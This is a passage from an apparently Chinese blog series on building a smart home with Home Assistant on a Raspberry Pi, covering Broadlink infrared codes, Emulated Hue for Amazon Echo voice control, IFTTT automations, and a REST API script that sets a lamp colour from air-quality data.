command_on:</span> <span class="string">'JgBQAAABKpMUEhMSExITEhMSExITEhMSEzYVNRQ3EzcUNRU2FDYUNhQSEzYUEhMSExITEhMSExITNhQSEzcTNhU2FDYTNxQ2FAAFIgABKUgVAA0FAAAAAAAAAAA='</span></span><br><span class="line"><span class="attr">        command_off:</span> <span class="string">'JgBYAAABKpMTEhQRFBISEhQRFBISEhQSEzYUNxM2FDYUNhQ2FDcTNxQRFBEUEhISFBEUEhISFBITNhQ2FDYUNhQ2FDYUNhQ3EwAFIgABKUkUAAxdAAEqSBUADQU='</span></span><br><span class="line"><span class="attr">      ac:</span></span><br><span class="line"><span class="attr">        friendly_name:</span> <span class="string">"ac--"</span></span><br><span class="line"><span class="attr">        command_on:</span> <span class="string">'JgDKAJKQETYSExA2EjcQExESETcREhETEDYSEhETEDcRNxESETcQNhITEDcRNhE2EjYRNhI2ERMRNhETERIRExATERIRExA3ERIRExATETcQNxESERMQExE3EDcRNhETERIRNxE2EayQkRE2EhMQNxE2ERMREhE2EhIREhE3ERIRExA2EzURExE3EDYSEhE2EjYRNhI3EDYSNhETETYRExESERIRExESERIRNxESERMQExE2ETYSEhETEBMRNhE2EjcQExESETYSNRIADQUAAAAAAAAAAAAAAAAAAA=='</span></span><br><span class="line"><span class="attr">        command_off:</span> <span class="string">'JgDKAJGRETYSExA2EjcQExESETYSEhESETYSEhETEDYSNxATETYRExE2ETYSNhE2EhIRNhI2ETcREhETEBMREhE2ERMREhE3ETYRNxESERMQExESERMQExESERMQNxE2ETcRNxA3EauRkRE2EhIRNhI2ERMREhE3EBMREhE2EhIRExA2EjYRExE2ERMRNhE2EjYRNhISETcRNhE3ERIRExATERIRNhETERIRNhI2ETYSEhETEBMREhETEBMREhETEDcRNxA3ETYRNhIADQUAAAAAAAAAAAAAAAAAAA=='</span></span><br></pre></td></tr></table></figure>

<p>BroadLink 集成到了 Switch 下的一个 platform，也就是 HA 把你的家电作为了一个开关处理，这也意味我们只能控制家电的开、关状态，虽然不能像遥控器上进行更多操作，比如空调设定温度，电视选频道，但开和关绝对是最大的需求了。配置中 <code>host</code> 和 <code>mac</code> 都可以在路由器的管理页面找到，重点我们看 <code>switches</code> 字段的配置。</p>
<p>switches 下面就是你所有的设备。每个设备都有 <strong>friendly_name</strong>，<strong>commandon*</strong>，<strong>command***</strong>off** 三个属性。friendly_name 就是你给你的设备取的名字，command<em>on 和 command</em>off 就是开和关对应的红外码或者频射码，这两个码如何获得呢？</p>
<p>我们来到 HA 控制页面,选择 Developer Tools 下的 Service 选项，在 Call a service from a component 的 Domain 下面选择 <strong>broadlink</strong>, Service 选择 <strong>learncommand19216810_250</strong>，然后点击<strong>CALL SERVICE</strong>。</p>
<p><img src="/articles/acf227f8/4.png" alt="img"></p>
<p>不出意外，你的 Broadlink 亮起了橙色的灯，标记正处于学习状态，下一步你要做的就是拿起遥控器，比如我现在要学习空调开的红外码，我就对准 Broadlink 按下空调遥控板上“开”的按钮。</p>
<p><img src="/articles/acf227f8/5.png" alt="img"></p>
<p>当橙色灯熄灭了，就表示学习成功了。然后前往 Developer Tools 下的 States，在这里你会发现 <strong>Recieved packet is:</strong> 后面跟着一长串字母和数字，那就是你刚才按下按钮的红外码了。</p>
<p><img src="/articles/acf227f8/6.png" alt="img"></p>
<p>复制这一串红外码到配置文件中的 <strong>command_on</strong> 或者 <strong>command_off</strong>，如果你按的是 开，就把开的红外码复制到 <strong>command_on</strong>，其他我就不说了。</p>
<p>重启 HA ，你就能在控制页面看到了。HA 的控制页面不仅仅可以桌面上看，手机上也可以哦。</p>
<p><img src="/articles/acf227f8/7.png" alt="img"></p>
<p>Broadlink 真是个好东西，它的意义在于让一些老家电可以毫不费力地摇身一变成智能设备，进而实现语音控制。</p>
<p>说到语音控制，上面已经接入了这么多家电，都是用 HomeAssistant 的控制页面进行控制，说好的 Amazon Echo 语音控制呢？别急，我们这就开始配置 Amazon Echo 服务。</p>
<p>Alexa / Amazon Echo 的文档在<a href="https://home-assistant.io/components/alexa/" target="_blank" rel="noopener">这里</a>, 但是这个文档是介绍如何在 Echo 上自己创建一个能让 HA 识别 Skill，对我们没有作用，我们需要的仅仅是让 Echo 开关设备就行了，所以你应该看<a href="https://home-assistant.io/components/emulated_hue/" target="_blank" rel="noopener">Emulated Hue Bridge</a> 这个服务。</p>
<p>顾名思义，Emulated Hue Bridge 就是把你的电器模拟成 <a href="http://www2.meethue.com/en-us/productdetail/philips-hue-bridge" target="_blank" rel="noopener">Hue Bridge</a>，而 Hue Bridge 是 Amazon Echo 官方支持的设备。所以就能实现 Echo 控制你的家电了，看到这个原理，是不是醍醐灌顶，真是巧妙啊。</p>
<p>Hue Bridge 的最简单只要配置两个参数就能运行了。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">emulated_hue:</span>  </span><br><span class="line"><span class="attr">  type:</span> <span class="string">alexa</span></span><br><span class="line"><span class="attr">  host_ip:</span> <span class="number">192.168</span><span class="number">.10</span><span class="number">.200</span></span><br></pre></td></tr></table></figure>

<p>重启 HA，通过 Amazon Echo 的官方 App ———— Alexa 就能扫描到所有设备了。</p>
<p><img src="/articles/acf227f8/8.png" alt="img"></p>
<p>由于 Emulated Hue Bridge 默认是把所有开关都模拟了，所以你的 Echo 能识别出一些不是硬件的服务，比如 check config, restart hass…. 这些都是我设置的其他服务，由于也是开关，所以都被 Emulated Hue Bridge 给模拟了。解决办法就是 homeassistant 这个服务下的 customize 里通过 <strong>emulated_hue: false</strong> 手动进行忽略。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">homeassistant:</span>  </span><br><span class="line"><span class="attr">  customize:</span></span><br><span class="line">    <span class="string">light.bedroom_light:</span></span><br><span class="line"><span class="attr">      emulated_hue:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      emulated_hue_name:</span> <span class="string">"back office light"</span></span><br></pre></td></tr></table></figure>

<p>如果 Alexa 的 Your Devices 里面出现你的家电，也就意味着你已经可以用语音控制你的家电了。只是，你得说英文。</p>
]]></content>
      <categories>
        <category>智能工程</category>
      </categories>
      <tags>
        <tag>Ai</tag>
      </tags>
  </entry>
  <entry>
    <title>智能家居实践(二):初识HomeAssistant</title>
    <url>/articles/fe97d7ea.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>这一篇我们要开始学习使用 HomeAssistant 了。在此之前，为了更方便地写代码，我们还需要做一些准备工作。</p>
<a id="more"></a>

<h4 id="开启-Samba"><a href="#开启-Samba" class="headerlink" title="开启 Samba"></a><strong>开启 Samba</strong></h4><p>还记得上一节中我们使用的 FTP 软件吗？你可以在 <code>/home/pi/hassbian-scripts</code> 这个目录下找到一些已经预装好的脚本，如果没有，可以以 pi 的身份 clone 这个 <a href="https://github.com/home-assistant/hassbian-scripts.git" target="_blank" rel="noopener">repo</a> :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/home-assistant/hassbian-scripts.git</span><br></pre></td></tr></table></figure>

<p>然后运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./hassbian-scripts/install_samba.sh</span><br></pre></td></tr></table></figure>

<p>大概5分钟左右的安装时间。安装完你可以看到下面的界面：</p>
<p><img src="/articles/fe97d7ea/1.png" alt="img">然后在 Finder 的共享下面看到树莓派开放的服务器了。这样的好处是，你可以像访问本地的文件一样访问树莓派上的文件了。</p>
<p><img src="/articles/fe97d7ea/2.png" alt="img"></p>
<p>然后就可以用 Sublime Text 打开这个目录开始编辑了：</p>
<p><img src="/articles/fe97d7ea/3.png" alt="img"></p>
<h4 id="Configuration-yaml"><a href="#Configuration-yaml" class="headerlink" title="Configuration.yaml"></a><strong>Configuration.yaml</strong></h4><p>集成的所有服务可以在 <a href="https://home-assistant.io/components/#search/system" target="_blank" rel="noopener">Components</a> 页面搜索。</p>
<p><img src="/articles/fe97d7ea/4.png" alt="img"></p>
<p>接下去我们的所有工作都是在 <code>Configuration.yaml</code> 这个文件里完成。 HomeAssistant 的配置文件是 Yaml 写的，每个字段都表示一个服务，比如 <code>homeassistant:</code>,<code>introduction</code>,<code>http</code>,<code>sun</code>,<code>sensor</code> …. 等都是 HomeAssistant 内建好的服务。一般来说，你需要什么服务就添加什么服务，重启 HA 即可在控制页面看到新添加的服务了。</p>
<p>凡是改动了 Configuration.yaml 配置文件，都需要重启 HomeAssistant 服务才能生效。你可以使用命令重启，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart home-assistant.service</span><br></pre></td></tr></table></figure>

<p>也可以在管理界面重启</p>
<p><img src="/articles/fe97d7ea/5.png" alt="img"></p>
<h2 id="举些例子："><a href="#举些例子：" class="headerlink" title="举些例子："></a>举些例子：</h2><h4 id="homeassistant-文档"><a href="#homeassistant-文档" class="headerlink" title="homeassistant 文档"></a><strong>homeassistant</strong> <a href="https://home-assistant.io/docs/configuration/basic/" target="_blank" rel="noopener">文档</a></h4><p>这个服务下面提供一些全局的信息配置。<code>latitude</code> 和 <code>longitude</code> 字段填入自己所在位置的经纬度，方便一些需要用到经纬度的服务准确获取信息，比如 <code>sunrise</code> 服务就可以准确获取你当前位置的日出日落时间；<code>unit_system</code> 使用英制单位还是公制单位；<code>time_zone</code> 你的时区….</p>
<h4 id="automation-文档"><a href="#automation-文档" class="headerlink" title="automation 文档"></a><strong>automation</strong> <a href="https://home-assistant.io/components/automation/" target="_blank" rel="noopener">文档</a></h4><p>这是一个内置的自动机，类似 IFTTT，都是当满足条件时触发操作，但 automation 的操作空间比 IFTTT 大的多，他不仅可以设置多个条件，还有触发一系列操作。</p>
<p>automation 由三部分组成：</p>
<p><code>trigger</code> – <em>When Paulus arrives home</em></p>
<p><code>condition</code> – <em>and it is after sunset:</em></p>
<p><code>action</code> – <em>Turn the lights in the living room on</em></p>
<p>举个我使用的例子：</p>
<ul>
<li>HomeAssistant 服务启动时候用 IFTTT 给我推送一条推送：</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">automation</span> <span class="number">1</span><span class="string">:</span>  </span><br><span class="line"><span class="attr">  alias:</span> <span class="string">'Startup Notification'</span></span><br><span class="line"><span class="attr">  trigger:</span></span><br><span class="line"><span class="attr">    - platform:</span> <span class="string">event</span></span><br><span class="line"><span class="attr">      event_type:</span> <span class="string">homeassistant_start</span></span><br><span class="line"><span class="attr">  action:</span></span><br><span class="line"><span class="attr">  - service:</span> <span class="string">ifttt.trigger</span></span><br><span class="line"><span class="attr">    data:</span> <span class="string">&#123;"event":"homeassistant_start",</span> <span class="string">"value1"</span><span class="string">:"Home</span> <span class="string">Assistant</span> <span class="string">已启动"&#125;</span></span><br></pre></td></tr></table></figure>

<p>其中 trigger 的 platform 字段必须制定一个值， <a href="https://home-assistant.io/docs/configuration/events/" target="_blank" rel="noopener">event(事件总线)</a> 是 HA 内建的一个 platform ，任何服务都可以获取和监听系统事件总线的事件，比如 <code>HOMEASSISTANT_START</code> , <code>HOMEASSISTANT_STOP</code> , <code>SERVICE_REGISTERED</code> …. 我在上面的 automation 里监听了 HA 启动的事件，没有 <code>condition</code> ,直接触发 <code>action</code>，<code>action</code> 的 <code>service</code> 也必须指定一个服务。</p>
<h4 id="notify-文档"><a href="#notify-文档" class="headerlink" title="notify 文档"></a><strong>notify</strong> <a href="https://home-assistant.io/components/notify/" target="_blank" rel="noopener">文档</a></h4><p>这就是 HA 的推送服务了，基本你能想到的和你想不到的 platform 都已经集成进来了，具体请看文档。比如我用的是 <code>pushbullet</code>。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">notify:</span>  </span><br><span class="line"><span class="attr">  - name:</span> <span class="string">notify</span></span><br><span class="line"><span class="attr">    platform:</span> <span class="string">pushbullet</span></span><br><span class="line"><span class="attr">    api_key:</span> <span class="string">xxxxx</span></span><br></pre></td></tr></table></figure>

<p>一旦配置了这个服务，就可以在其他服务里调用它了。比如在我们之前提到的 automation 里面就可以使用：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">automation</span> <span class="number">3</span><span class="string">:</span>  </span><br><span class="line"><span class="attr">- alias:</span> <span class="string">Send</span> <span class="string">message</span> <span class="string">at</span> <span class="string">lunch</span> <span class="string">time</span></span><br><span class="line"><span class="attr">  trigger:</span></span><br><span class="line"><span class="attr">    platform:</span> <span class="string">time</span></span><br><span class="line"><span class="attr">    hours:</span> <span class="number">12</span></span><br><span class="line"><span class="attr">    minutes:</span> <span class="number">15</span></span><br><span class="line"><span class="attr">    seconds:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">  action:</span></span><br><span class="line"><span class="attr">    service:</span> <span class="string">notify.notify</span></span><br><span class="line"><span class="attr">    data:</span></span><br><span class="line"><span class="attr">      message:</span> <span class="string">'该吃午饭了'</span></span><br><span class="line"><span class="attr">      title:</span> <span class="string">'为了健康，请规律饮食！'</span></span><br></pre></td></tr></table></figure>

<p>注意我这里的 action 就用了 notify.notify 来找到你在其他地方配置的这个 notify 服务。</p>
<h4 id="IFTTT-文档"><a href="#IFTTT-文档" class="headerlink" title="IFTTT 文档"></a><strong>IFTTT</strong> <a href="https://home-assistant.io/components/ifttt/" target="_blank" rel="noopener">文档</a></h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ifttt:</span>  </span><br><span class="line"><span class="attr">  key:</span> <span class="string">xxxxx-x-xxxxxxxxxxxxx</span></span><br></pre></td></tr></table></figure>

<p>IFTTT 的配置很简单，就只要配一个 key 就行，key 需要在 <a href="https://ifttt.com/maker_webhooks" target="_blank" rel="noopener">Maker Channel</a> 里生成。接下来我们来看看如果配合 IFTTT 使用 HomeAssistant。</p>
<p>首先新建一个 Applet， this 选择 <code>Maker Webhooks</code>,选择 <code>Receive a web request</code>，然后给事件取一个名字。</p>
<p><img src="/articles/fe97d7ea/6.png" alt="img"></p>
<p>之后在 HomeAssistant 里面就可以通过这个名字触发这条 IFTTT 了。在此之前，我们先把下面的 that 步骤完成，为了直观地看到测试效果，我们选择 <code>Notifications</code> - <code>Send a notification from IFTTT app</code></p>
<p><img src="/articles/fe97d7ea/7.png" alt="img"></p>
<p>这里有很多 Ingredient 占位符， EventName 就是之前我们给事件声明的名字，Value1,Value2,Value3 我们可以在 HA 里面自己传过去，OccurredAt 就是发生的时间。</p>
<p>创建完成这条 Applet 之后，我们就可以开始用 HA 来触发了。触发的方式就太多了。</p>
<p>1.最简单的，在我们的管理界面：</p>
<p><img src="/articles/fe97d7ea/8.png" alt="img"></p>
<p><code>event</code> 字段后面就跟我们之前填写的事件的名称，后面的 Value1,2,3 对应之前 IFTTT 里的参数。然后点击 <code>CALL SERVICE</code> ，不出意外就可以在几秒钟之后看到 IFTTT 给你推送了一条消息。</p>
<p>2.其次我们还可以在 automation 里的 action 中触发</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">action:</span></span><br><span class="line"><span class="attr">- service:</span> <span class="string">ifttt.trigger</span></span><br><span class="line"><span class="attr">  data:</span> <span class="string">&#123;"event":"HA_Start",</span> <span class="string">"value1"</span><span class="string">:"Home</span> <span class="string">Assistant</span> <span class="string">已启动"&#125;</span></span><br></pre></td></tr></table></figure>

<p>3.<a href="https://home-assistant.io/developers/rest_api/" target="_blank" rel="noopener">RESTful API</a> 这真的是个强大功能。这意味着我们可以像调用普通 API 一样调用 HomeAssistant 的所有服务。由于太过强大，我另起一节介绍。</p>
<p><strong>4. RESTful API</strong> <a href="https://home-assistant.io/developers/rest_api/" target="_blank" rel="noopener">文档</a></p>
<p>和普通的 RESTful API 一样， HA 的 RESTful API 也是返回的 JSON 格式，另外，如果你配置了<a href="https://home-assistant.io/components/http/" target="_blank" rel="noopener">HTTP</a> 这个服务并设置了密码（这个密码就是你登录控制面板的密码，推荐这么做），那么你只需要在调用 API 的时候传入密码参数即可。</p>
<p>具体 API 请大家看文档，我仅介绍比较常用的以做示范。</p>
<p><code>GET /api/services</code> – 获取当前可用的所有服务</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"domain"</span>: <span class="string">"ifttt"</span>,</span><br><span class="line">    <span class="attr">"services"</span>: &#123;</span><br><span class="line">      <span class="attr">"trigger"</span>: &#123;</span><br><span class="line">        <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"domain"</span>: <span class="string">"switch"</span>,</span><br><span class="line">    <span class="attr">"services"</span>: &#123;</span><br><span class="line">      <span class="attr">"toggle"</span>: &#123;</span><br><span class="line">        <span class="attr">"description"</span>: <span class="string">"Toggles a switch state"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">          <span class="attr">"entity_id"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Name(s) of entities to toggle"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"switch.living_room"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"turn_off"</span>: &#123;</span><br><span class="line">        <span class="attr">"description"</span>: <span class="string">"Turn a switch off"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">          <span class="attr">"entity_id"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Name(s) of entities to turn off"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"switch.living_room"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"turn_on"</span>: &#123;</span><br><span class="line">        <span class="attr">"description"</span>: <span class="string">"Turn a switch on"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">          <span class="attr">"entity_id"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Name(s) of entities to turn on"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"switch.living_room"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"domain"</span>: <span class="string">"light"</span>,</span><br><span class="line">    <span class="attr">"services"</span>: &#123;</span><br><span class="line">      <span class="attr">"toggle"</span>: &#123;</span><br><span class="line">        <span class="attr">"description"</span>: <span class="string">"Toggles a light"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">          <span class="attr">"entity_id"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Name(s) of entities to toggle"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"light.kitchen"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"transition"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Duration in seconds it takes to get to next state"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="number">60</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"turn_off"</span>: &#123;</span><br><span class="line">        <span class="attr">"description"</span>: <span class="string">"Turn a light off"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">          <span class="attr">"entity_id"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Name(s) of entities to turn off"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"light.kitchen"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"flash"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"If the light should flash"</span>,</span><br><span class="line">            <span class="attr">"values"</span>: [</span><br><span class="line">              <span class="string">"short"</span>,</span><br><span class="line">              <span class="string">"long"</span></span><br><span class="line">            ]</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"transition"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Duration in seconds it takes to get to next state"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="number">60</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"turn_on"</span>: &#123;</span><br><span class="line">        <span class="attr">"description"</span>: <span class="string">"Turn a light on"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">          <span class="attr">"brightness"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Number between 0..255 indicating brightness"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="number">120</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"color_name"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"A human readable color name"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"red"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"color_temp"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Color temperature for the light in mireds (154-500)"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"250"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"effect"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Light effect"</span>,</span><br><span class="line">            <span class="attr">"values"</span>: [</span><br><span class="line">              <span class="string">"colorloop"</span>,</span><br><span class="line">              <span class="string">"random"</span></span><br><span class="line">            ]</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"entity_id"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Name(s) of entities to turn on"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"light.kitchen"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"flash"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"If the light should flash"</span>,</span><br><span class="line">            <span class="attr">"values"</span>: [</span><br><span class="line">              <span class="string">"short"</span>,</span><br><span class="line">              <span class="string">"long"</span></span><br><span class="line">            ]</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"profile"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Name of a light profile to use"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"relax"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"rgb_color"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Color for the light in RGB-format"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"[255, 100, 100]"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"transition"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Duration in seconds it takes to get to next state"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="number">60</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"white_value"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Number between 0..255 indicating level of white"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"250"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"xy_color"</span>: &#123;</span><br><span class="line">            <span class="attr">"description"</span>: <span class="string">"Color for the light in XY-format"</span>,</span><br><span class="line">            <span class="attr">"example"</span>: <span class="string">"[0.52, 0.43]"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>你实际的 JSON 内容一定比我上面的要多，因为我删了一些不常用，留下精华做示范。可以看到最外面是个数组，每个元素都是一项服务，我留下了 <code>ifttt</code>,<code>switch</code>,<code>light</code>，之所以会出现三个服务，就是因为你在 Configuration.yaml 里面添加了这三个服务。根据上面返回的信息，我们可以写出调用 IFTTT 服务的 API 如下：</p>
<p>API: <code>http://YOUR_IP_ADDRESS:8123/api/services/ifttt/trigger?api_password=YOUR_PASSWORD</code> (YOUR_IP_ADDRESS 可以是局域网IP，也可以是域名)</p>
<p>Method: <code>POST</code></p>
<p>Content-Type: <code>application/json</code></p>
<p>Params: <code>{&quot;event&quot;: &quot;homeassistant_start&quot;, &quot;value1&quot;: &quot;来自的 RESTful API 的推送&quot;}</code></p>
<p>这里推荐一个 Mac 上我常用的测试 API 的工具 —— <a href="http://mmattozzi.github.io/cocoa-rest-client/" target="_blank" rel="noopener">Cocoa Rest Client</a>.</p>
<p><img src="/articles/fe97d7ea/9.png" alt="img"></p>
<p>显示 <code>HTTP 200 No Error</code> 说明没有问题，接下来的几秒内你就会收到一条推送了。现在，你是不是和我一样觉得神奇之余还有一丝成就感。</p>
<p>更进一步，你看到我上面还有 ‘light’ 和 ‘switch’ 这两个服务，这些是因为我配置了硬件相关的服务后出现的，这也就意味着你可以用 API 来控制你的电视，空调，灯泡灯一切电器。</p>
<p>例如通过 API 开启空气净化器：</p>
<p><img src="/articles/fe97d7ea/10.png" alt="img"></p>
<p>通过 API 开启 Yeelight智能灯泡并切换到指定颜色和亮度：</p>
<p><img src="/articles/fe97d7ea/11.png" alt="img"></p>
<p>比如我还写了一个 Shell 脚本每天早晨8点自动运行，通过 API 获取 <a href="http://aqicn.org/api/" target="_blank" rel="noopener">World Air Quality Index</a> 的空气质量数据，如果 PM2.5大于50就通过 API 让床头灯颜色显示红色，否则显示绿色，这样我早上醒来一看床头灯的颜色就知道今天要不要带口罩了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># get AQI </span></span><br><span class="line">MY_VAR=<span class="string">"<span class="variable">$(curl https://api.waqi.info/feed/shanghai/?token=xxxxxxxx | jq "&#123;aqi: .data.aqi, pm25: .data.iaqi.pm25.v, pm10: .data.iaqi.pm10.v&#125;")</span>"</span>  </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$MY_VAR</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pm25=<span class="string">"<span class="variable">$(echo $MY_VAR | jq ".pm25")</span>"</span>  </span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$pm25</span> -gt 50 ]]; <span class="keyword">then</span>  </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"PM2.5 大于50"</span></span><br><span class="line">    curl -X POST -H <span class="string">'x-ha-access: xxxxx'</span> \</span><br><span class="line">     -H <span class="string">'Content-Type: application/json'</span> \</span><br><span class="line">     -d <span class="string">'&#123;"color_name":"red","brightness":"190"&#125;'</span> \</span><br><span class="line">     http://IP_ADDRESS:8123/api/services/light/turn_on?api_password=PASSWORD \ </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>想到平时一直接触的 API 竟然可以用来控制你的电器，是不是又一次感觉不可思议。这一切，都归功于 HomeAssistant 这个成熟的开源社区，再次表达敬佩和感谢之情。</p>
<p>其实当 IFTTT 的 Maker Webhooks 作为 that 部分的时候，也可以充当调用 API 的发起方（Make a web request）。比如我的一条 IFTTT 是：当我到家的的时候自动开启所有电器。这里面 Maker Webhooks 作为了 that 部分就可以发起一个 HTTP Request 了。</p>
<p><img src="/articles/fe97d7ea/12.png" alt="img"></p>
<p>至此，通过 API 实现了 IFTTT 和 HA 全部打通，两者既可以作为主动发起方，也可以作为被动执行方，简言之，你可以让 HA 触发一条 IFTTT，IFTTT 再触发硬件，也可以 IFTTT 触发 HA 的 automation，automation 再触发其他操作….. 总之已经可以结合出无数多的可能性，限制你的只有你的想象力。</p>
<p>好啦，下一篇文章，我们要开始接入硬件了，要知道我前面铺垫了这么久，最终要实现的功能还是用 Amazon Echo 和 Siri 控制所有家电啊。</p>
]]></content>
      <categories>
        <category>智能工程</category>
      </categories>
      <tags>
        <tag>Ai</tag>
      </tags>
  </entry>
  <entry>
    <title>智能家居实践(一):树莓派的配置</title>
    <url>/articles/ece79d2c.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>某天我像往常一样逛知乎，突然就看到了一篇文章，文章内容是“马克扎克伯格自己打造的智能家庭 AI — Javals”，我相信看过这篇文章或者知道这个报道的人肯定不少。我当时也没觉得我自己也能打造一个 AI 系统，因为小扎的一套完全从改装硬件电路到中央服务器都是自己实现，我没那么大本事，但我当时正好沉迷于效率软件　IFTTT、Workflow、Alfred，其中我发现 IFTTT 里面有很多 Applets 和硬件有关，这勾起了我的好奇心，我虽做不到小扎那样的工程，但能不能利用市面上现有的产品，打造一个类似的智能家居系统？</p>
<p>首先我觉得，一个真正智能的家庭系统一定是时刻待命的，而不是当我需要的时候还得掏手机，然后按下一个按键或者把手机拿到嘴边进行语音控制。所以我一开始就明确了让 Amazon echo 作为前端，它是一个时刻待命的只需要你叫一声 Alexa 就能唤醒的设备，而且可以覆盖一个50平米的家庭，真正做到了时刻在你身边。</p>
<p>然后就是解决问题的常规套路：Google 搜索关键字 Hack,Amazon echo，经过一番信息筛选，我发现了一个普遍被大家提及的名词 — HomeAssistant。</p>
